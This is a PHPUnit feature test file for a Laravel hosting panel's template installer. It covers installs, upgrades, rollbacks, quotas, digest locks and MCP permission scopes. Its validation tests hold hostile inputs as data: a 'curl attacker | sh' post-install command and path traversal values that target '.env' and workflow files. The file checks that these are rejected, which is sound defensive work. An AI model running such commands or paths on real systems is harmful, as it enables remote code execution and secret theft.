<?php

namespace Tests\Feature;

use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
use Illuminate\Validation\ValidationException;
use PHPUnit\Framework\Attributes\TestWith;
use QOpenPanel\Community\Models\Resource;
use QOpenPanel\Community\Models\User;
use QOpenPanel\Community\Providers\QOpenPanelServiceProvider;
use QOpenPanel\Community\Services\TemplateCatalog;
use QOpenPanel\Community\Services\TemplateInstaller;
use Tests\TestCase;

class TemplatesTest extends TestCase
{
    use RefreshDatabase;

    private array $files = [];

    private array $directories = [];

    protected function tearDown(): void
    {
        foreach (array_reverse($this->files) as $path) {
            if (is_file($path)) {
                unlink($path);
            }
        }foreach (array_reverse($this->directories) as $path) {
            if (is_dir($path)) {
                rmdir($path);
            }
        }parent::tearDown();
    }

    private function account(): User
    {
        $user = User::factory()->create();
        DB::table('qopenpanel_accounts')->insert(['user_id' => $user->id, 'disk_mb' => 2048, 'memory_mb' => 1024, 'project_limit' => 2, 'database_limit' => 2]);

        return $user;
    }

    private function payload(string $version = '1.0.0', string $name = 'template-project'): array
    {
        return ['template_id' => 'static-site', 'version' => $version, 'name' => $name];
    }

    private function catalog(): TemplateCatalog
    {
        $root = storage_path('framework/testing/templates-'.Str::uuid());
        mkdir($root, 0700);
        $this->directories[] = $root;
        mkdir($root.'/static-site', 0700);
        $this->directories[] = $root.'/static-site';
        foreach (['1.0.0', '1.1.0'] as $version) {
            $path = $root.'/static-site/'.$version.'.json';
            copy(QOpenPanelServiceProvider::path('resources/templates/static-site/'.$version.'.json'), $path);
            $this->files[] = $path;
        }$this->files[] = $root.'/catalog.lock.json';
        config(['qopenpanel.templates.path' => $root]);
        $catalog = app(TemplateCatalog::class);
        $catalog->updateLock();

        return $catalog;
    }

    private function newRelease(array $changes): void
    {
        $manifest = json_decode(file_get_contents(QOpenPanelServiceProvider::path('resources/templates/static-site/1.1.0.json')), true);
        $manifest = [...$manifest, ...$changes];
        $path = config('qopenpanel.templates.path').'/static-site/'.$manifest['version'].'.json';
        file_put_contents($path, json_encode($manifest));
        $this->files[] = $path;
        app(TemplateCatalog::class)->updateLock();
    }

    public function test_guests_cannot_install_or_download_templates(): void
    {
        $this->post('/qopenpanel/templates/install', $this->payload())->assertRedirect('/qopenpanel/login');
        $this->get('/qopenpanel/templates/1/download')->assertRedirect('/qopenpanel/login');
    }

    public function test_installation_creates_project_files_provenance_and_snapshot(): void
    {
        $user = $this->account();
        $this->actingAs($user)->post('/qopenpanel/templates/install', $this->payload())->assertSessionHasNoErrors()->assertRedirect();
        $resource = Resource::where('user_id', $user->id)->firstOrFail();
        $this->assertSame('Static', $resource->engine);
        $this->assertDatabaseHas('qopenpanel_template_installations', ['resource_id' => $resource->id, 'version' => '1.0.0']);
        $this->assertDatabaseHas('qopenpanel_template_installation_history', ['action' => 'install', 'version' => '1.0.0', 'sequence' => 1]);
        $snapshot = json_decode(DB::table('qopenpanel_project_versions')->where('resource_id', $resource->id)->value('manifest'), true);
        $this->assertSame('static-site', $snapshot['template']['template_id']);
        $this->assertSame('1.0.0', $snapshot['template']['version']);
        $this->assertDatabaseCount('qopenpanel_project_versions', 1);
    }

    public function test_upgrade_and_rollback_append_history_without_overwriting_old_snapshots(): void
    {
        $user = $this->account();
        $this->actingAs($user);
        $installed = app(TemplateInstaller::class)->install('static-site', '1.0.0', 'landing');
        $first = DB::table('qopenpanel_template_installation_history')->first();
        $this->post('/qopenpanel/templates/'.$installed['resource_id'].'/update', ['version' => '1.1.0', 'expected_revision' => 1])->assertSessionHasNoErrors();
        $this->assertDatabaseHas('qopenpanel_template_installations', ['resource_id' => $installed['resource_id'], 'version' => '1.1.0']);
        $this->post('/qopenpanel/templates/'.$installed['resource_id'].'/rollback', ['history_id' => $first->id, 'expected_revision' => 2])->assertSessionHasNoErrors();
        $this->assertDatabaseHas('qopenpanel_template_installations', ['resource_id' => $installed['resource_id'], 'version' => '1.0.0']);
        $this->assertDatabaseHas('qopenpanel_resources', ['id' => $installed['resource_id'], 'revision' => 3]);
        $this->assertDatabaseCount('qopenpanel_template_installation_history', 3);
        $this->assertDatabaseCount('qopenpanel_project_versions', 3);
        $this->assertSame($first->manifest, DB::table('qopenpanel_template_installation_history')->where('id', $first->id)->value('manifest'));
    }

    public function test_stale_revision_rejects_update_without_changing_installation(): void
    {
        $this->actingAs($this->account());
        $installed = app(TemplateInstaller::class)->install('static-site', '1.0.0', 'landing');
        $this->post('/qopenpanel/templates/'.$installed['resource_id'].'/update', ['version' => '1.1.0', 'expected_revision' => 99])->assertSessionHasErrors('template');
        $this->assertDatabaseHas('qopenpanel_template_installations', ['resource_id' => $installed['resource_id'], 'version' => '1.0.0']);
        $this->assertDatabaseCount('qopenpanel_template_installation_history', 1);
    }

    public function test_other_accounts_cannot_update_or_export_a_template_project(): void
    {
        $this->actingAs($this->account());
        $installed = app(TemplateInstaller::class)->install('static-site', '1.0.0', 'private-project');
        $this->actingAs($this->account())->post('/qopenpanel/templates/'.$installed['resource_id'].'/update', ['version' => '1.1.0', 'expected_revision' => 1])->assertNotFound();
        $this->get('/qopenpanel/templates/'.$installed['resource_id'].'/download')->assertNotFound();
    }

    public function test_quota_failure_rolls_back_the_complete_installation(): void
    {
        $user = $this->account();
        DB::table('qopenpanel_accounts')->where('user_id', $user->id)->update(['project_limit' => 0]);
        $this->actingAs($user)->post('/qopenpanel/templates/install', $this->payload())->assertSessionHasErrors('name');
        $this->assertDatabaseCount('qopenpanel_resources', 0);
        $this->assertDatabaseCount('qopenpanel_template_installations', 0);
        $this->assertDatabaseCount('qopenpanel_project_versions', 0);
    }

    public function test_upgrade_disk_quota_failure_preserves_old_release(): void
    {
        $this->catalog();
        $this->newRelease(['version' => '2.0.0', 'disk_mb' => 3000]);
        $this->actingAs($this->account());
        $installed = app(TemplateInstaller::class)->install('static-site', '1.0.0', 'landing');
        $this->post('/qopenpanel/templates/'.$installed['resource_id'].'/update', ['version' => '2.0.0', 'expected_revision' => 1])->assertSessionHasErrors('disk_mb');
        $this->assertDatabaseHas('qopenpanel_template_installations', ['resource_id' => $installed['resource_id'], 'version' => '1.0.0']);
        $this->assertDatabaseCount('qopenpanel_template_installation_history', 1);
    }

    public function test_incompatible_release_cannot_be_installed(): void
    {
        $this->catalog();
        $this->newRelease(['version' => '2.0.0', 'panel_min' => '99.0.0']);
        $this->actingAs($this->account())->post('/qopenpanel/templates/install', $this->payload('2.0.0'))->assertSessionHasErrors('template');
        $this->assertDatabaseCount('qopenpanel_resources', 0);
    }

    public function test_export_contains_the_pinned_source_and_template_lock(): void
    {
        $this->actingAs($this->account());
        $installed = app(TemplateInstaller::class)->install('static-site', '1.0.0', 'landing');
        $response = $this->get('/qopenpanel/templates/'.$installed['resource_id'].'/download');
        $response->assertOk()->assertDownload('static-site-1.0.0.zip');
        $path = $response->baseResponse->getFile()->getPathname();
        $zip = new \ZipArchive;
        $this->assertTrue($zip->open($path) === true);
        try {
            $this->assertStringContainsString('Build something worth sharing.', $zip->getFromName('index.html'));
            $lock = json_decode($zip->getFromName('qopenpanel-template.lock.json'), true);
            $this->assertSame('1.0.0', $lock['version']);
            $this->assertSame($installed['digest'], $lock['digest']);
        } finally {
            $zip->close();
            if (is_file($path)) {
                unlink($path);
            }
        }
    }

    #[TestWith(['../../outside.php'])]
    #[TestWith(['src/.env'])]
    #[TestWith(['.github/workflows/run.yml'])]
    #[TestWith(['qopenpanel-template.lock.json'])]
    #[TestWith(['NUL.txt'])]
    public function test_unsafe_template_paths_are_rejected(string $path): void
    {
        $manifest = json_decode(file_get_contents(QOpenPanelServiceProvider::path('resources/templates/static-site/1.0.0.json')), true);
        $manifest['files'] = [$path => 'unsafe'];
        $this->expectException(\RuntimeException::class);
        app(TemplateCatalog::class)->validate($manifest);
    }

    public function test_unknown_executable_manifest_fields_are_rejected(): void
    {
        $manifest = json_decode(file_get_contents(QOpenPanelServiceProvider::path('resources/templates/static-site/1.0.0.json')), true);
        $manifest['post_install'] = 'curl attacker | sh';
        $this->expectException(ValidationException::class);
        app(TemplateCatalog::class)->validate($manifest);
    }

    public function test_published_template_digest_cannot_be_rewritten(): void
    {
        $catalog = $this->catalog();
        $path = config('qopenpanel.templates.path').'/static-site/1.0.0.json';
        $manifest = json_decode(file_get_contents($path), true);
        $manifest['files']['index.html'] = 'changed';
        file_put_contents($path, json_encode($manifest));
        $this->expectException(\RuntimeException::class);
        $catalog->updateLock();
    }

    public function test_catalog_refuses_a_modified_release_even_if_lock_was_not_updated(): void
    {
        $catalog = $this->catalog();
        $path = config('qopenpanel.templates.path').'/static-site/1.0.0.json';
        $manifest = json_decode(file_get_contents($path), true);
        $manifest['author'] = 'changed';
        file_put_contents($path, json_encode($manifest));
        $this->expectException(\RuntimeException::class);
        $catalog->releases();
    }

    public function test_mcp_read_only_grant_cannot_install_templates(): void
    {
        $user = $this->account();
        $token = 'qpm_'.bin2hex(random_bytes(48));
        DB::table('qopenpanel_mcp_grants')->insert(['id' => (string) Str::uuid(), 'user_id' => $user->id, 'token_hash' => hash('sha256', $token), 'scopes' => json_encode(['panel:read']), 'expires_at' => now()->addHour(), 'created_at' => now(), 'updated_at' => now()]);
        $this->postJson('/qopenpanel/mcp/panel', ['jsonrpc' => '2.0', 'id' => 1, 'method' => 'tools/call', 'params' => ['name' => 'project_templates', 'arguments' => ['action' => 'install', ...$this->payload()]]], ['Authorization' => 'Bearer '.$token, 'MCP-Protocol-Version' => '2025-11-25'])->assertOk()->assertJsonPath('result.content.0.text', 'forbidden');
        $this->assertDatabaseCount('qopenpanel_template_installations', 0);
    }
}
